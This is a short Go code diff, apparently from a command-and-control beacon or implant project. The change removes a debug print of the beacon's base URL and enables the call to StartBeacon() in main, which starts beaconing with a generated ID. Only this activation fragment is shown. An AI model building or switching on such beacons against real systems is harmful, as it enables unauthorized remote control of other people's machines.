@@ -3,7 +3,6 @@ package main
 import (
 	"encoding/base64"
 	"encoding/json"
-	"fmt"
 	"os"
 	"os/user"
 	"runtime"
@@ -58,8 +57,8 @@ var function_mapping = map[string]func(string) string{
 func main() {
 	// Generate global beacon_id and start beaconin process (same thread)
 	beacon_id = Modules.GenerateID(beacon_username)
-	fmt.Println(base_url)
-	// StartBeacon()
+	// fmt.Println(base_url)
+	StartBeacon()
 }
 
 func StartBeacon() {
